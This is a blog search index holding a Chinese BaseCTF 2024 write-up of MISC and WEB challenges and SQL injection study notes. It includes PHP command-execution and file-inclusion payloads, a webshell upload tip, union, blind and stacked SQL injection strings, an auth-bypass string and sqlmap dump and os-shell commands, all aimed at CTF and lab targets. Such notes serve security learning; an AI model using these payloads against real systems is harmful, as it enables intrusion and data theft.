<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BaseCTF 2024</title>
      <link href="/posts/BaseCTF2024.html"/>
      <url>/posts/BaseCTF2024.html</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h3><p>解密base64即可</p><h3 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h3><p>音频分离成左右声道后,将其中一个声道反相,然后再次合并两个声道,听到摩斯密码<br>FOLLOW YOUR HEART 套上flag头即可<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228806909-95bf6e63-9443-45c3-9210-74b88a7f6723.png#averageHue=%23413e3d&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=udf1547da&amp;originHeight=695&amp;originWidth=1023&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua198b2a2-9512-4191-ae79-dbf8d280c1a&amp;title=" alt=""></p><h3 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h3><p>lsb最低位拿到key<br>解开zip后又有一个伪加密的,改09为00即可,txt底部解base64得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228806894-9fcc94ed-e4e1-4bda-b10f-1b8845108584.png#averageHue=%2343853c&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=uf0568a47&amp;originHeight=315&amp;originWidth=603&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ue89386a6-5b81-4dc5-87b3-e51be014e91&amp;title=" alt=""></p><h3 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h3><p>考查对python数组的熟悉,得到的py是可以运行的,一步一步检查即可</p><ol><li>总长38字符</li><li>开头为<code>BaseCTF&#123;</code></li><li><code>Mp</code>在第11,12位(flag.find(‘Mp’) != 10指的是M应该在flag[10]也就是第11位)</li><li>末尾为<code>3x&#125;</code></li><li>末尾为<code>&#125;</code></li><li>总共有4个<code>_</code></li><li>以下划线为分割字符长度为:14_2_6_4_8</li></ol><p>此时flag为<code>BaseCTF&#123;**Mp**_**_******_****_*****3x&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228807303-c8137588-e1b7-4c90-acbb-7fe8db011c3e.png#averageHue=%23201e1c&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=u5b4567a5&amp;originHeight=70&amp;originWidth=518&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=udcaf30f9-f5f3-4ca7-a87b-c544dcffc91&amp;title=" alt=""></p><ol><li>12-32(不包括32),每隔4个取一个为<code>lsT_n</code>(12 16 20 24 28)</li><li>以emoji猫为分割的前9位为<code>BASECTF&#123;S</code>(此时s还不确定大小写)</li><li>flag[-11]的5次方是1024(倒数第11位为<code>4</code>)</li><li>flag[-7:-3]倒数第七到倒数第四分别为解密base64为<code>0mPl</code></li><li>flag[::-7]表示从后往前每隔7个取一位,所以先hex解密后逆向<code>s1srC&#125;</code></li></ol><p><code>&#125;</code>为倒数第一位,然后每隔七位再取,此时flag为<code>BaseCTF&#123;s*Mpl*_``_*s_**_``T***_**4n_*0mPl3x&#125;</code></p><ol><li>flag[12::11]从第13位开始,隔11为取一位,<code>l r</code>(第13和第24位为<code>l r</code>)</li><li>第21到第26位为ascii解密<code>t3r_Th</code></li></ol><p>此时flag为<code>BaseCTF&#123;s1Mpl*_*s_**Tt3r_Th4n_C0mPl3x&#125;</code></p><ol><li><p>flag[17:20]中的三个字符的加权和等于41378751114180610<code>_Be</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的值和基数</span></span><br><span class="line">target_value = <span class="number">41378751114180610</span></span><br><span class="line">base = <span class="number">20240815</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算加权和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_sum</span>(<span class="params">flag_substring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * base ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag_substring))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有可能的 3 字符组合</span></span><br><span class="line"><span class="keyword">for</span> chars <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>), repeat=<span class="number">3</span>):  <span class="comment"># 限定在可打印字符范围内</span></span><br><span class="line">    flag_substring = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> chars)</span><br><span class="line">    <span class="keyword">if</span> calculate_sum(flag_substring) == target_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found matching flag substring: <span class="subst">&#123;flag_substring&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#Found matching flag substring: _Be</span></span><br></pre></td></tr></table></figure></li><li><p>flag[0]为字母为<code>已知的B</code>[8]小写<code>确定第九位s为小写</code>[13]为数字<code>第十四位为0-9</code></p></li><li>将[13]的字符3为替换为bro<code>确定第十四位为3</code>,比较[13][15]是否为bro 1<code>确定第十六位为1</code></li><li>用于哈希确认,不用也行</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228807363-b3b579dd-050b-4b1d-866d-e5c5f3325bab.png#averageHue=%231f1e1c&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=u7d258593&amp;originHeight=70&amp;originWidth=523&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u0b812687-2ca9-4964-a78f-6a47c623722&amp;title=" alt=""></p><h3 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a>[Week1] 正着看还是反着看呢？</h3><p>拿到了一个十六进制数据逆序的jpg图片<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_and_save_to_file</span>(<span class="params">hex_string, file_name</span>):</span><br><span class="line">    <span class="comment"># 处理十六进制字符串，去除空格并分割每个字节</span></span><br><span class="line">    hex_bytes = hex_string.split()</span><br><span class="line">    <span class="comment"># 反转字节顺序</span></span><br><span class="line">    reversed_bytes = hex_bytes[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 重新拼接成十六进制字符串</span></span><br><span class="line">    reversed_hex_string = <span class="string">&#x27;&#x27;</span>.join(reversed_bytes)</span><br><span class="line">    <span class="comment"># 将反转后的十六进制字符串转换为字节</span></span><br><span class="line">    byte_data = <span class="built_in">bytes</span>.fromhex(reversed_hex_string)</span><br><span class="line">    <span class="comment"># 将字节数据写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(byte_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入的十六进制文本</span></span><br><span class="line">input_hex = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xxxxx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  <span class="comment"># 替换为你的十六进制数据</span></span><br><span class="line"><span class="comment"># 输出文件名</span></span><br><span class="line">output_file = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="comment"># 反向处理并保存到文件</span></span><br><span class="line">reverse_hex_and_save_to_file(input_hex, output_file)</span><br></pre></td></tr></table></figure><br>恢复后binwalk得到flag.txt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228807752-431acdd9-e63b-40ae-a9e3-5d28756329d7.png#averageHue=%23282d3a&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=ue4047bec&amp;originHeight=148&amp;originWidth=1088&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u3a262289-d6a4-4e70-8ec3-2eb48166649&amp;title=" alt=""></p><h3 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h3><p>wireshark打开后直接到导出对象导出flag.php逆序后得到flag</p><h3 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h3><p>悄悄告诉你: flag 在 flag.basectf.fun<br>进不去！怎么想都进不去吧？<br>访问不了就查询下该域名的DNS有没有文字记录信息<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46488370/1724228808503-58b6d061-fb9e-4259-ac20-74ae115df44e.png#averageHue=%23e5e6c7&amp;clientId=u6a6ff4e1-4622-4&amp;from=paste&amp;id=u9f2307dc&amp;originHeight=549&amp;originWidth=1255&amp;originalType=url&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u088f5c02-31a6-451c-bff0-bf0473935c1&amp;title=" alt=""></p><h3 id="Week1-倒计时？海报！"><a href="#Week1-倒计时？海报！" class="headerlink" title="[Week1] 倒计时？海报！"></a>[Week1] 倒计时？海报！</h3><p>构式<br>赛事群相册的每一张图都用stegsolve查看不同颜色通道拿到flag内容合并即可</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h3><p><strong>源码处拿到flag</strong></p><h3 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h3><p><strong>先传png一句话然后bp抓包修改后缀即可,flag在/flag</strong></p><h3 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$name2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$password2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name2</span> !== <span class="variable">$password2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name2</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$password2</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再看看啊，马上绕过嘞！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错啦错啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;没看到参数呐&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>数组绕过md5即可</strong><br>payload: <code>GET:name[]=1&amp;name2[]=1</code><br><code>POST:password[]=2&amp;password2[]=2</code></p><h3 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•`"></a>[Week1] 喵喵喵´•ﻌ•`</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DT&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行 <strong>paylaod:</strong><code>?DT=system(&#39;tac /f*&#39;);</code></p><h3 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span><span class="symbol">:basectf=we1c%</span>2500me</span><br><span class="line"><span class="variable constant_">POST</span><span class="symbol">:Base=fl%</span>40g</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Base</span></span><br><span class="line"><span class="title class_">Referer</span>: <span class="title class_">Base</span></span><br><span class="line">x-forwarded-<span class="symbol">for:</span> localhost</span><br><span class="line"><span class="symbol">cookie:</span> c00k13=i can<span class="string">&#x27;t eat it</span></span><br></pre></td></tr></table></figure><h3 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>);</span><br></pre></td></tr></table></figure><p><code>payload:pen=data://text/plain,Aura&amp;challenge=``http://jasmineaura.github.io.[自己的域名]/&amp;gift=php://filter/convert.base64-encode/resource=flag.php</code><br>DNS绑定jasmineaura.github.io.example.com这样一个n级域名到自己公网ip,然后搭一个有’’已经收到Kengwang的礼物啦’’内容的网页,保证file_get_contents能读到即可</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/posts/sql.html"/>
      <url>/posts/sql.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本章基于mysql讲解</p><h2 id="mysql常用查询语句"><a href="#mysql常用查询语句" class="headerlink" title="mysql常用查询语句"></a>mysql常用查询语句</h2><p><code>select database();</code>查找当前所处数据库<br><code>show databases;</code>查找所有的数据库<br><code>select schema_name from information_schema.schemata;</code>同上</p></blockquote><p><code>show tables from DB_NAME;</code>查数据库中的所有表<br><code>select table_name from DB_NAME;</code>同上</p><p><code>show columns from TABLE_NAME;</code>查找当前表中的所有列<br><code>describe(DESC) TABLE_NAME;</code>同上</p><ul><li>SELECT [DISTINCT] [CONCAT (col1,”:”,col2) as col] selection_list |要查询的内容,选择哪些列</li><li>FROM 数据表名tb_list |指定数据表</li><li>WHERE primary_constraint |查询时需要满足的内容</li><li>GROUP BY grouping_columns |如何对结果进行分组</li><li>ORDER BY sorting_columns |如何对结果进行排序</li><li>HAVING secondary_constraint |查询时满足的第二条件</li><li>LIMIT |限定输出的查询结果</li></ul><h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><strong>方法1：</strong><br>  首先我们可以使用(转义字符)来判断SQL注入的闭合方式。<br>  原理:当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。<br>  分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。<br><strong>方法2：</strong></p><ol><li><p>首先尝试：<br>?id=1’<br>?id=1”<br>结果一：如果都报错<br>判断闭合符为：整形闭合。</p></li><li><p>结果二：如果单引号报错，双引号不报错。<br>继续尝试<br>?id=1’ –-+<br>结果1：无报错<br>判断闭合符为：单引号闭合。<br>结果2：报错<br>判断闭合符可能为：单引号加括号。</p></li><li><p>结果三：如果单引号不报错，双引号报错。<br>继续尝试<br>?id=1” -–+<br>结果1：结果无报错<br>判断闭合符为：双引号闭合。<br>结果2：报错<br>判断闭合符可能为：双引号加括号。</p></li></ol><blockquote><p>注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判段有多少个括号，可用二分法快速判断</p></blockquote><h2 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h2><p>当知道其sql闭合方式后,则可以使用或等方式使其判断为true实现万能密钥的功能<br>例:<code>1&#39;or 1=1 --+</code></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h3><p><code>order by 1/2/3/4....</code>第n个报错则列数为(n-1)</p><h3 id="获取库名（schema）"><a href="#获取库名（schema）" class="headerlink" title="获取库名（schema）"></a>获取库名（schema）</h3><p><code>?id=-1&#39; union select 1,2,database()--+(%20)</code><br>`?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata —+``</p><blockquote><p>基于union的规则尽量让前面的数为负数或者0，要让前面失败才能执行后面的语句</p></blockquote><h3 id="获取表名（table）"><a href="#获取表名（table）" class="headerlink" title="获取表名（table）"></a>获取表名（table）</h3><p><code>?id=0&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&quot;moectf&quot;--+(%20)</code></p><h3 id="获取列名（column）"><a href="#获取列名（column）" class="headerlink" title="获取列名（column）"></a>获取列名（column）</h3><p><code>?id=0&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=&quot;moectf&quot; and table_name=&#39;flag&#39;--+(%20)</code></p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p><code>?id=0&#39; union select 1,2,group_concat(flag) from moectf.flag --+</code></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在mysql中,可以通过<code>;</code>来执行多个命令<br>这样攻击者就可以通过在一个查询中执行多个SQL语句来实现对数据库的多个操作，从而绕过应用程序的限制和过滤。<br><code>?id=1&#39;;show databases --+</code><br><img src="https://s2.loli.net/2024/07/27/fUuMer7vyapgjsF.png" alt=""></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><ol><li>url编码</li><li>不可打印字符(见ascii表,用url编码表示)</li><li>/**/代替空格</li><li>双写绕过 例:uunionnion<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2>即在SQL注入过程中，SQL语句执行查询后，查询数据不能直接出现到前端中，需要使用一些特殊的方式来判断或尝试，这个过程成为盲注<br>盲注一般分为布尔盲注与时间盲注两类,不仅在WEB题目中出现,也经常出现在misc的盲注日志分析中<h3 id="布尔盲注-有回显"><a href="#布尔盲注-有回显" class="headerlink" title="布尔盲注(有回显)"></a>布尔盲注(有回显)</h3>利用 <code>=</code> <code>&lt;</code> <code>&gt;</code> 来让服务器判断是否正确从而返回True或False,适用有回显信息时<br>例如:<br><code>admin&#39; and substr(database(),1,1) &gt; &#39;a&#39; #</code>返回true<br><code>admin&#39; and substr(database(),1,1) &gt; &#39;b&#39; #</code>返回false<br>由于字符b在字符a的后面,即ascii值大于a,所以爆破出数据库名的第一位为b<br><em>例题:</em> <blockquote><p>ISCTF2023 1z_Ssql</p></blockquote></li></ol><p><img src="https://s2.loli.net/2024/07/27/1kayxMiHQERr8nu.png" alt=""><br><code>admin&#39; and substr((select §xx§ from bthcls.§xx§ limit 0,1),1,1)&gt;&#39;a&#39; #</code><br>这里是拿到了表和列的字典,只有当匹配到对应表列有值时才会去判断其值的第一位ascii值是否大于a的ascii值<br>这里把a换成前一位的<code>、</code>会更好一些<br><img src="https://s2.loli.net/2024/07/27/ExKqbu9OAic4twg.png" alt=""><br>通过判断回显数据包长度不同得到hint</p><h3 id="时间盲注-无回显"><a href="#时间盲注-无回显" class="headerlink" title="时间盲注(无回显)"></a>时间盲注(无回显)</h3><p>利用 sleep() 函数实现,当服务器判断正确时执行sleep函数,导致回显时间与非正确时出现差别,适用于无回显信息时<br><code>?id=1&#39; and if(length(database())&gt;8,sleep(2),0) --+</code><br>如果数据库名的长度大于8则睡眠两秒,通过判断回显时长得到信息</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><blockquote><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。</p></blockquote><p><em>常用指令</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</code>GET请求<br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --batch</code>全部默认<br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --data=&quot;id=1&amp;user=admin&quot;</code>POST请求<br><code>sqlmap -u URL --level 1</code>测试复杂等级(1-5)<br><em>查询所有数据库</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --dbs</code><br><em>输出指定数据库名字下的全部表</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security --tables</code><br><em>输出指定数据名下指定表下的全部列</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security -T users --columns</code><br><em>输出指定数据库指定列指定字段下的全部数据</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C password --dump</code><br><em>Getshell</em><br><code>sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell</code></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>参考：<br><a href="https://blog.csdn.net/chenzzhenguo/article/details/108843675">sql注入中关于“—+“,“—“和“#“</a><br><a href="https://blog.csdn.net/yeahPeng11/article/details/119486404">MySQL基本语句手册（查找必备！！）</a><br><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南(手把手保姆版)</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PNG</title>
      <link href="/posts/png.html"/>
      <url>/posts/png.html</url>
      
